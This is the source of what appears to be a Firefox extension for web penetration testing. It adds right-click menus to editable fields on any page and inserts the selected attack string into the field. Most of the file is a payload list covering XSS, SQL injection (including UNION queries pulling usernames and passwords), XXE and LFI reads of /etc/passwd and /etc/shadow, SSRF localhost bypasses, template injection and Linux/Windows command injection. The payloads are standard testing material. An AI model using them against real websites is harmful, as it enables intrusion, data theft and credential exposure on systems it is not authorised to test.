let elem = 0

let defaults = {
  "payloads": [
    { "id": "0",
      "parentId":"xss",
      "payload": "<img src=1 onerror=alert()>"
    },
    { "id": "1",
      "parentId":"sqli",
      "payload": "' or 1=1;-- "
    },
    { "id": "2",
      "parentId":"sqli",
      "payload": "\" or 1=1;-- "
    },
    { "id": "3",
      "parentId":"ssti",
      "payload": "${7*7}"
    },
    { "id": "4",
      "parentId":"xxe",
      "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY read SYSTEM \"file:///etc/passwd\">]><root>&read;</root>"
    },
    { "id": "5",
      "parentId":"ldap-injection",
      "payload": "*()|&'"
    },
    { "id": "6",
      "parentId":"command-injection-windows",
      "payload": "; cat /etc/shadow"
    },
    { "id": "7",
      "parentId":"xss",
      "payload": "javascript:alert(1)"
    },
    { "id": "8",
      "parentId":"xss",
      "payload": " \'-alert(1)//"
    },
    { "id": "9",
      "parentId":"xss",
      "payload": "'-alert(1)-'"
    },
    { "id": "10",
      "parentId":"xss",
      "payload": "</script><script>alert(1)</script>"
    },
    { "id": "11",
      "parentId":"xss",
      "payload": "\"autofocus onfocus=alert(1)//"
    },
    { "id": "12",
      "parentId":"xss",
      "payload": "\"><img src onerror=alert(1)>"
    },
    { "id": "13",
      "parentId":"xss",
      "payload": "\";alert('XSS');//"
    },
    { "id": "14",
      "parentId":"xss",
      "payload": "\"--!><Svg/Onload=confirm`cookie`>\""
    },
    { "id": "15",
      "parentId":"xss",
      "payload": "<frameset onload=javascript:alert(1)>"
    },
    { "id": "16",
      "parentId":"xss",
      "payload": "<img src=x onerror=prompt(1)>"
    },    {
      "id":"17",
      "parentId":"sqli",
      "payload":"' OR '1"
   },
   {
      "id":"18",
      "parentId":"sqli",
      "payload":"' OR 1 -- -"
   },
   {
      "id":"19",
      "parentId":"sqli",
      "payload":"\" OR \"\" = \""
   },
   {
      "id":"20",
      "parentId":"sqli",
      "payload":"\" OR 1 = 1 -- -"
   },
   {
      "id":"21",
      "parentId":"sqli",
      "payload":"' OR '' = '"
   },
   {
      "id":"22",
      "parentId":"sqli",
      "payload":"'='"
   },
   {
      "id":"23",
      "parentId":"sqli",
      "payload":"OR 1=1"
   },
   {
      "id":"24",
      "parentId":"sqli",
      "payload":"' OR 'x'='x"
   },
   {
      "id":"25",
      "parentId":"sqli",
      "payload":"' AND id IS NULL; --"
   },
   {
      "id":"26",
      "parentId":"sqli",
      "payload":"' OR 1=0--"
   },
   {
      "id":"27",
      "parentId":"sqli",
      "payload":"%27%20or%201=1"
   },
   {
      "id":"28",
      "parentId":"sqli",
      "payload":"*(|(object=*))"
   },
   {
      "id":"29",
      "parentId":"sqli",
      "payload":")%20or%20('x'='x"
   },
   {
      "id":"30",
      "parentId":"sqli",
      "payload":"%20or%201=1"
   },
   {
      "id":"31",
      "parentId":"sqli",
      "payload":"1) or pg_sleep(__TIME__)--"
   },
   {
      "id":"32",
      "parentId":"sqli",
      "payload":"/**/or/**/1/**/=1"
   },
   {
      "id":"33",
      "parentId":"sqli",
      "payload":"' or username like '%"
   },
   {
      "id":"34",
      "parentId":"sqli",
      "payload":");waitfor delay '0:0:__TIME__'--"
   },
   {
      "id":"35",
      "parentId":"sqli",
      "payload":"or isNULL(1/0) /*"
   },
   {
      "id":"36",
      "parentId":"sqli",
      "payload":"x' or 1=1 or 'x'='y"
   },
   {
      "id":"37",
      "parentId":"sqli",
      "payload":" --- ORDER BY ---"
   },
   {
      "id":"38",
      "parentId":"sqli",
      "payload":"1' ORDER BY 1--+"
   },
   {
      "id":"39",
      "parentId":"sqli",
      "payload":"1' ORDER BY 2--+"
   },
   {
      "id":"40",
      "parentId":"sqli",
      "payload":"1' ORDER BY 3--+"
   },
   {
      "id":"41",
      "parentId":"sqli",
      "payload":"1' ORDER BY 1,2--+"
   },
   {
      "id":"42",
      "parentId":"sqli",
      "payload":"1' ORDER BY 1,2,3--+"
   },
   {
      "id":"43",
      "parentId":"sqli",
      "payload":"1' GROUP BY 1,2,--+"
   },
   {
      "id":"44",
      "parentId":"sqli",
      "payload":"1' GROUP BY 1,2,3--+"
   },
   {
      "id":"45",
      "parentId":"sqli",
      "payload":"' UNION SELECT NULL-- "
   },
   {
      "id":"46",
      "parentId":"sqli",
      "payload":"' UNION SELECT NULL,NULL--"
   },
   {
      "id":"47",
      "parentId":"sqli",
      "payload":"' UNION SELECT NULL,NULL,NULL--"
   },
   {
      "id":"48",
      "parentId":"sqli",
      "payload":"' UNION SELECT NULL,NULL,NULL,NULL,'a'-- //"
   },
   {
      "id":"49",
      "parentId":"sqli",
      "payload":"' union select null, id, username, password, fname from users -- //"
   },
   {
      "id":"50",
      "parentId":"sqli",
      "payload":"' UNION SELECT username, password FROM users --"
   },
   {
      "id":"60",
      "parentId":"xss",
      "payload":"'-alert(1)//"
   },
   {
      "id":"62",
      "parentId":"lfi",
      "payload":"/etc/passwd"
   },
   {
      "id":"63",
      "parentId":"lfi",
      "payload":"etc/passwd%00"
   },
   {
      "id":"64",
      "parentId":"lfi",
      "payload":"../../../../../../../../etc/passwd"
   },
   {
      "id":"65",
      "parentId":"lfi",
      "payload":"%252e%252e%252f"
   },
   {
      "id":"66",
      "parentId":"lfi",
      "payload":"....//....//etc/passwd"
   },
   {
      "id":"67",
      "parentId":"lfi",
      "payload":"php://filter/convert.base64-encode/resource=/etc/passwd"
   },
   {
      "id":"68",
      "parentId":"lfi",
      "payload":"pHp://FilTer/convert.base64-encode/resource=/etc/passwd"
   },
   {
      "id":"69",
      "parentId":"lfi",
      "payload":"php://filter/read=string.rot13/resource=/etc/passwd"
   },
   {
      "id":"70",
      "parentId":"lfi",
      "payload":"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
   },
   {
      "id":"71",
      "parentId":"lfi",
      "payload":"php:expect://id"
   },
   {
      "id":"72",
      "parentId":"lfi",
      "payload":"php:expect://ls"
   },
   {
      "id":"73",
      "parentId":"lfi",
      "payload":"/etc/issue"
   },
   {
      "id":"74",
      "parentId":"lfi",
      "payload":"/etc/passwd"
   },
   {
      "id":"75",
      "parentId":"lfi",
      "payload":"/etc/shadow"
   },
   {
      "id":"76",
      "parentId":"lfi",
      "payload":"/etc/group"
   },
   {
      "id":"77",
      "parentId":"lfi",
      "payload":"/etc/hosts"
   },
   {
      "id":"78",
      "parentId":"lfi",
      "payload":"/etc/motd"
   },
   {
      "id":"79",
      "parentId":"lfi",
      "payload":"/etc/mysql/my.cnf"
   },
   {
      "id":"80",
      "parentId":"lfi",
      "payload":"/proc/[0-9]*/fd/[0-9]*"
   },
   {
      "id":"81",
      "parentId":"lfi",
      "payload":"/proc/self/environ"
   },
   {
      "id":"82",
      "parentId":"lfi",
      "payload":"/proc/version"
   },
   {
      "id":"83",
      "parentId":"lfi",
      "payload":"/proc/cmdline"
   },
   {
      "id":"84",
      "parentId":"xxe",
      "payload":"<!--?xml version=\"1.0\" ?--> <!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <userInfo> <firstName>John</firstName><lastName>&ent;</lastName></userInfo>"
   },
   {
      "id":"85",
      "parentId":"xxe",
      "payload":"<?xml version=\"1.0\"?><!DOCTYPE foo [  <!ELEMENT foo (#ANY)> <!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
   },
   {
      "id":"86",
      "parentId":"xxe",
      "payload":"<?xml version=\"1.0\"?><!DOCTYPE foo [  <!ELEMENT foo (#ANY)> <!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> <!ENTITY blind SYSTEM \"https://www.example.com/?%xxe;\">]><foo>&blind;</foo>"
   },
   {
      "id":"87",
      "parentId":"xxe",
      "payload":"<?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY ac SYSTEM \"php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php\">]><foo><result>&ac;</result></foo>"
   },
   {
      "id":"88",
      "parentId":"xxe",
      "payload":"<?xml version=\"1.0\"?>  <!DOCTYPE foo [  <!ELEMENT foo (#ANY)><!ENTITY xxe SYSTEM \"https://www.example.com/text.txt\">]><foo>&xxe;</foo>"
   },
   {
      "id":"89",
      "parentId":"xxe",
      "payload":"<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>SSRFhttp://127.0.0.1:80"
   },
   {
      "id":"90",
      "parentId":"ssrf",
      "payload":"http://0.0.0.0:443"
   },
   {
      "id":"91",
      "parentId":"ssrf",
      "payload":"http://localhost:22"
   },
   {
      "id":"92",
      "parentId":"ssrf",
      "payload":"https://127.0.0.1/"
   },
   {
      "id":"93",
      "parentId":"ssrf",
      "payload":"https://localhost/"
   },
   {
      "id":"94",
      "parentId":"ssrf",
      "payload":"http://[::]:80/"
   },
   {
      "id":"95",
      "parentId":"ssrf",
      "payload":"http://[::]:25/"
   },
   {
      "id":"96",
      "parentId":"ssrf",
      "payload":"http://[::]:22/"
   },
   {
      "id":"97",
      "parentId":"ssrf",
      "payload":"http://[::]:3128/"
   },
   {
      "id":"98",
      "parentId":"ssrf",
      "payload":"http://0000::1:80/"
   },
   {
      "id":"99",
      "parentId":"ssrf",
      "payload":"http://0000::1:25/"
   },
   {
      "id":"100",
      "parentId":"ssrf",
      "payload":"http://0000::1:22/"
   },
   {
      "id":"101",
      "parentId":"ssrf",
      "payload":"http://0000::1:3128/"
   },
   {
      "id":"102",
      "parentId":"ssrf",
      "payload":"http://spoofed.burpcollaborator.net"
   },
   {
      "id":"103",
      "parentId":"ssrf",
      "payload":"http://localtest.me"
   },
   {
      "id":"104",
      "parentId":"ssrf",
      "payload":"http://customer1.app.localhost.my.company.127.0.0.1.nip.io"
   },
   {
      "id":"105",
      "parentId":"ssrf",
      "payload":"http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost"
   },
   {
      "id":"106",
      "parentId":"ssrf",
      "payload":"http://bugbounty.dod.network redirect to 127.0.0.2 == localhost"
   },
   {
      "id":"107",
      "parentId":"ssrf",
      "payload":"http://127.127.127.127"
   },
   {
      "id":"108",
      "parentId":"ssrf",
      "payload":"http://127.0.1.3"
   },
   {
      "id":"109",
      "parentId":"ssrf",
      "payload":"http://127.0.0.0"
   },
   {
      "id":"110",
      "parentId":"ssrf",
      "payload":"http://2130706433/"
   },
   {
      "id":"111",
      "parentId":"ssrf",
      "payload":"http://3232235521/"
   },
   {
      "id":"112",
      "parentId":"ssrf",
      "payload":"http://3232235777/"
   },
   {
      "id":"113",
      "parentId":"ssrf",
      "payload":"http://2852039166/"
   },
   {
      "id":"114",
      "parentId":"ssrf",
      "payload":"http://0177.0.0.1/"
   },
   {
      "id":"115",
      "parentId":"ssrf",
      "payload":"http://o177.0.0.1/"
   },
   {
      "id":"116",
      "parentId":"ssrf",
      "payload":"http://0o177.0.0.1/"
   },
   {
      "id":"117",
      "parentId":"ssrf",
      "payload":"http://q177.0.0.1/"
   },
   {
      "id":"118",
      "parentId":"ssrf",
      "payload":"http://[0:0:0:0:0:ffff:127.0.0.1]"
   },
   {
      "id":"119",
      "parentId":"ssrf",
      "payload":"localhost:+11211aaa"
   },
   {
      "id":"120",
      "parentId":"ssrf",
      "payload":"localhost:00011211aaaa"
   },
   {
      "id":"121",
      "parentId":"ssrf",
      "payload":"http://0/"
   },
   {
      "id":"122",
      "parentId":"ssrf",
      "payload":"http://127.1"
   },
   {
      "id":"123",
      "parentId":"ssrf",
      "payload":"http://127.0.1"
   },
   {
      "id":"124",
      "parentId":"command-injection-linux",
      "payload":"OS"
   },
   {
      "id":"125",
      "parentId":"command-injection-linux",
      "payload":"/index.html|id|"
   },
   {
      "id":"126",
      "parentId":"command-injection-linux",
      "payload":";netstat -a;"
   },
   {
      "id":"127",
      "parentId":"command-injection-linux",
      "payload":";system('cat%20/etc/passwd')"
   },
   {
      "id":"128",
      "parentId":"command-injection-linux",
      "payload":";system('id')"
   },
   {
      "id":"129",
      "parentId":"command-injection-linux",
      "payload":"|/usr/bin/id|"
   },
   {
      "id":"130",
      "parentId":"command-injection-linux",
      "payload":"||/usr/bin/id|"
   },
   {
      "id":"131",
      "parentId":"command-injection-linux",
      "payload":"|id;"
   },
   {
      "id":"132",
      "parentId":"command-injection-linux",
      "payload":"\n/bin/ls -al\n"
   },
   {
      "id":"133",
      "parentId":"command-injection-linux",
      "payload":"\n/usr/bin/id\n"
   },
   {
      "id":"134",
      "parentId":"command-injection-linux",
      "payload":"|usr/bin/id\n"
   },
   {
      "id":"135",
      "parentId":"command-injection-linux",
      "payload":"|nid\n"
   },
   {
      "id":"136",
      "parentId":"command-injection-linux",
      "payload":"`id`"
   },
   {
      "id":"137",
      "parentId":"command-injection-linux",
      "payload":"`/usr/bin/id`"
   },
   {
      "id":"138",
      "parentId":"command-injection-linux",
      "payload":"`${print `id`}`"
   },
   {
      "id":"139",
      "parentId":"command-injection-linux",
      "payload":"${print `pwd`}"
   },
   {
      "id":"140",
      "parentId":"command-injection-linux",
      "payload":"${echo `pwd`}"
   },
   {
      "id":"141",
      "parentId":"command-injection-linux",
      "payload":"$(`cat /etc/passwd`)"
   },
   {
      "id":"142",
      "parentId":"command-injection-linux",
      "payload":";phpinfo()"
   },
   {
      "id":"143",
      "parentId":"command-injection-linux",
      "payload":"%0Aid"
   },
   {
      "id":"144",
      "parentId":"command-injection-linux",
      "payload":"%0A/usr/bin/id%0A"
   },
   {
      "id":"145",
      "parentId":"command-injection-linux",
      "payload":"%0Aid%0A"
   },
   {
      "id":"146",
      "parentId":"command-injection-linux",
      "payload":"{{ get_user_file(\"/etc/passwd\") }}"
   },
   {
      "id":"147",
      "parentId":"command-injection-linux",
      "payload":"<!--#exec cmd=\"/usr/bin/id;-->"
   },
   {
      "id":"148",
      "parentId":"command-injection-linux",
      "payload":"<?php system(\"cat /etc/passwd\");?>"
   },
   {
      "id":"149",
      "parentId":"command-injection-linux",
      "payload":"&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;"
   },
   {
      "id":"150",
      "parentId":"command-injection-linux",
      "payload":"&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
   },
   {
      "id":"151",
      "parentId":"command-injection-linux",
      "payload":"&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;"
   },
   {
      "id":"153",
      "parentId":"command-injection-windows",
      "payload":"a|id|"
   },
   {
      "id":"154",
      "parentId":"command-injection-windows",
      "payload":"a;id|"
   },
   {
      "id":"155",
      "parentId":"command-injection-windows",
      "payload":"a;id;"
   },
   {
      "id":"156",
      "parentId":"command-injection-windows",
      "payload":"a;id\n"
   },
   {
      "id":"157",
      "parentId":"command-injection-windows",
      "payload":"%0a%0d"
   },
   {
      "id":"158",
      "parentId":"command-injection-windows",
      "payload":"| dir"
   },
   {
      "id":"159",
      "parentId":"command-injection-windows",
      "payload":"; dir"
   },
   {
      "id":"160",
      "parentId":"command-injection-windows",
      "payload":"$(`dir`)"
   },
   {
      "id":"161",
      "parentId":"command-injection-windows",
      "payload":"& dir"
   },
   {
      "id":"162",
      "parentId":"command-injection-windows",
      "payload":"&&dir"
   },
   {
      "id":"163",
      "parentId":"command-injection-windows",
      "payload":"&& dir"
   },
   {
      "id":"164",
      "parentId":"command-injection-windows",
      "payload":"| dir C:\""
   },
   {
      "id":"165",
      "parentId":"command-injection-windows",
      "payload":"; dir C:\""
   },
   {
      "id":"166",
      "parentId":"command-injection-windows",
      "payload":"& dir C:\""
   },
   {
      "id":"167",
      "parentId":"command-injection-windows",
      "payload":"&& dir C:\""
   },
   {
      "id":"168",
      "parentId":"command-injection-windows",
      "payload":"dir C:\""
   },
   {
      "id":"169",
      "parentId":"command-injection-windows",
      "payload":"| dir C:Users"
   },
   {
      "id":"170",
      "parentId":"command-injection-windows",
      "payload":"; dir C:Users"
   },
   {
      "id":"171",
      "parentId":"command-injection-windows",
      "payload":"& dir C:Users"
   },
   {
      "id":"172",
      "parentId":"command-injection-windows",
      "payload":"&& dir C:Users"
   },
   {
      "id":"173",
      "parentId":"command-injection-windows",
      "payload":"dir C:Users"
   },
   {
      "id":"174",
      "parentId":"command-injection-windows",
      "payload":"%20{${phpinfo()}}"
   },
   {
      "id":"175",
      "parentId":"command-injection-windows",
      "payload":"%20{${sleep(20)}}"
   },
   {
      "id":"176",
      "parentId":"command-injection-windows",
      "payload":"%20{${sleep(3)}}"
   },
   {
      "id":"177",
      "parentId":"command-injection-windows",
      "payload":";echo%20'<script>alert(1)</script>'"
   },
   {
      "id":"178",
      "parentId":"command-injection-windows",
      "payload":"eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')"
   },
   {
      "id":"179",
      "parentId":"command-injection-windows",
      "payload":"eval('ls')"
   },
   {
      "id":"180",
      "parentId":"command-injection-windows",
      "payload":"eval('pwd')"
   },
   {
      "id":"181",
      "parentId":"command-injection-windows",
      "payload":"eval('pwd');"
   },
   {
      "id":"183",
      "parentId":"command-injection-windows",
      "payload":"eval('sleep 5')"
   },
   {
      "id":"184",
      "parentId":"command-injection-windows",
      "payload":"eval('whoami')"
   },
   {
      "id":"185",
      "parentId":"command-injection-windows",
      "payload":"eval('whoami');"
   },
   {
      "id":"186",
      "parentId":"command-injection-windows",
      "payload":"exec('ls')"
   },
   {
      "id":"187",
      "parentId":"command-injection-windows",
      "payload":"exec('pwd')"
   },
   {
      "id":"188",
      "parentId":"command-injection-windows",
      "payload":"| ipconfig /all"
   },
   {
      "id":"189",
      "parentId":"command-injection-windows",
      "payload":"; ipconfig /all"
   },
   {
      "id":"190",
      "parentId":"command-injection-windows",
      "payload":"& ipconfig /all"
   },
   {
      "id":"191",
      "parentId":"command-injection-windows",
      "payload":"&& ipconfig /all"
   },
   {
      "id":"192",
      "parentId":"command-injection-windows",
      "payload":"|| perl -e 'print \"X\"x16096'"
   },
   {
      "id":"193",
      "parentId":"command-injection-windows",
      "payload":"| perl -e 'print \"X\"x16096'"
   },
   {
      "id":"194",
      "parentId":"command-injection-windows",
      "payload":"; perl -e 'print \"X\"x16096'"
   },
   {
      "id":"195",
      "parentId":"command-injection-windows",
      "payload":"& perl -e 'print \"X\"x16096'"
   },
   {
      "id":"196",
      "parentId":"command-injection-windows",
      "payload":"&& perl -e 'print \"X\"x16096'"
   },
   {
      "id":"197",
      "parentId":"command-injection-windows",
      "payload":";${@print(md5(RCEVulnerable))};"
   },
   {
      "id":"198",
      "parentId":"command-injection-windows",
      "payload":"${@print(\"RCEVulnerable\")}"
   },
   {
      "id":"199",
      "parentId":"command-injection-windows",
      "payload":"${@print(system($_SERVER['HTTP_USER_AGENT']))}"
   },
   {
      "id":"200",
      "parentId":"command-injection-windows",
      "payload":"$(`type C:\boot.ini`)"
   },
   {
      "id":"201",
      "parentId":"command-injection-windows",
      "payload":"&&type C:\\boot.ini"
   },
   {
      "id":"202",
      "parentId":"command-injection-windows",
      "payload":"| type C:Windows\repairSAM"
   },
   {
      "id":"203",
      "parentId":"command-injection-windows",
      "payload":"; type C:Windows\repairSAM"
   },
   {
      "id":"204",
      "parentId":"command-injection-windows",
      "payload":"& type C:Windows\repairSAM"
   },
   {
      "id":"205",
      "parentId":"command-injection-windows",
      "payload":"&& type C:Windows\repairSAM"
   },
   {
      "id":"206",
      "parentId":"command-injection-windows",
      "payload":"'; whoami"
   },
   {
      "id":"207",
      "parentId":"command-injection-windows",
      "payload":"\" whoami"
   },
   {
      "id":"208",
      "parentId":"command-injection-windows",
      "payload":"\" || whoami"
   },
   {
      "id":"209",
      "parentId":"command-injection-windows",
      "payload":"\" | whoami"
   },
   {
      "id":"210",
      "parentId":"command-injection-windows",
      "payload":"\" & whoami"
   },
   {
      "id":"211",
      "parentId":"command-injection-windows",
      "payload":"\" && whoami"
   },
   {
      "id":"212",
      "parentId":"command-injection-windows",
      "payload":"\"; whoami"
   },
   {
      "id":"213",
      "parentId":"command-injection-windows",
      "payload":"$(`whoami`)"
   },
   {
      "id":"214",
      "parentId":"command-injection-windows",
      "payload":"& whoami"
   },
   {
      "id":"215",
      "parentId":"command-injection-windows",
      "payload":"&& whoami"
   },
   {
      "id":"216",
      "parentId":"command-injection-windows",
      "payload":"{{ get_user_file(\"C:\boot.ini\") }}"
   },
   {
      "id":"217",
      "parentId":"command-injection-windows",
      "payload":"{{ get_user_file(\"/etc/hosts\") }}"
   },
   {
      "id":"218",
      "parentId":"command-injection-windows",
      "payload":"{{4+4}}"
   },
   {
      "id":"220",
      "parentId":"command-injection-windows",
      "payload":"{{person.name}}"
   },
   {
      "id":"221",
      "parentId":"command-injection-windows",
      "payload":"{1} + {1}"
   },
   {
      "id":"222",
      "parentId":"command-injection-windows",
      "payload":"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}"
   },
   {
      "id":"223",
      "parentId":"command-injection-windows",
      "payload":"{{[] .__ Class __.__ base __.__ subclasses __ ()}}"
   }
]}

let categories = [
  {
    "title":"XSS",
    "id": "xss"
  },
  {
    "title":"SQLi",
    "id": "sqli"
  },
  {
    "title":"LFI/RFI",
    "id": "lfi"
  },
  {
    "title":"XXE",
    "id": "xxe"
  },
  {
    "title":"SSRF",
    "id": "ssrf"
  },
  {
    "title":"Command Injection Linux",
    "id": "command-injection-linux"
  },
  {
    "title":"Command Injection Windows",
    "id":"command-injection-windows"
  },
  {
    "title":"LDAP Injection",
    "id": "ldap-injection"
  },
  {
    "title":"SSTI",
    "id": "ssti"
  },
]

//let data = browser.storage.local.get("payloads")
//data.then(onGot, onError);

// function onGot(item) {
//   if (JSON.stringify(item) === '{}'){
//     browser.storage.local.set(payloads);
//   } else {
//     payloads = item
//   }
// }

// function onError(error) {
//   console.log(`Error: ${error}`);
// }

for (categorie of categories){
  browser.menus.create({
    id: categorie.id,
    title: categorie.title,
    documentUrlPatterns: ["*://*/*"],
    contexts: ["editable"],
  });
}

for (payload of defaults.payloads){
  browser.menus.create({
    id: payload.id,
    title: payload.payload,
    parentId: payload.parentId,
    documentUrlPatterns: ["*://*/*"],
    contexts: ["editable"],
  });
} 

browser.menus.onClicked.addListener((info, tab) => {
  for (vuln of defaults.payloads){
    if (vuln.id === info.menuItemId){
      if (vuln.payload.includes("'")){
        browser.tabs.executeScript(tab.id, {
          frameId: info.frameId,
          code: `elem = browser.menus.getTargetElement(${info.targetElementId});
          elem.value="` + vuln.payload + `"`,
        });
      } else {
        browser.tabs.executeScript(tab.id, {
          frameId: info.frameId,
          code: `elem = browser.menus.getTargetElement(${info.targetElementId});
          elem.value='` + vuln.payload + `'`,
        });
      }
      break
    }
  }
});